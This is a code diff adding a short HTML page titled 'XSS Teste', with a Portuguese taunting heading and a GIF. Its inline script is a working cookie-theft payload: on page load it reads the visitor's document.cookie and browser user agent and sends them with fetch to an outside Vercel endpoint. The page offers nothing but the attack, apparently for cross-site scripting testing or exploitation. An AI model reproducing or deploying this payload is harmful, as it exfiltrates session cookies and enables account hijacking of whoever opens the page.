@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Teste</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <h1>O que tu tá fazendo aqui???</h1>
+  <img src="https://media.tenor.com/KuWfVfMLC58AAAAC/boca-rosa.gif" width="300">
+  <script>
+    const url = "https://teu-vercel.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent);
+    fetch(url);
+  </script>
+</body>
+</html>
